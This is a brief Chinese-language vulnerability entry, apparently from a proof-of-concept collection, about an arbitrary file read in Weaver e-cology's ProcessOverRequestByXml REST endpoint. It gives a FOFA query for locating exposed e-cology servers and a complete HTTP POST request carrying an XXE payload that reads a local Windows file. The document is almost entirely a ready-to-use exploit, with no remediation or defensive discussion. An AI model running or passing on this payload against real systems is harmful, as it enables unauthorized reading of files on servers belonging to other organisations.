## 泛微e-cology-ProcessOverRequestByXml接口存在任意文件读取漏洞


## fofa
```
body="/js/ecology8" || body="wui/common/css/w7OVFont_wev8.css" || (body="weaver" && body="ecology") || (header="ecology_JSessionId" && body="login/Login.jsp") || body="/wui/index.html" || body="jquery_wev8" && body="/login/Login.jsp?logintype=1"
```

## poc
```
POST /rest/ofs/ProcessOverRequestByXml HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 127.0.0.1
Content-Type: application/xml
Content-Length: 146

<?xml version="1.0" encoding="utf-8" ?><!DOCTYPE test[<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><reset><syscode>&test;</syscode></reset>
```
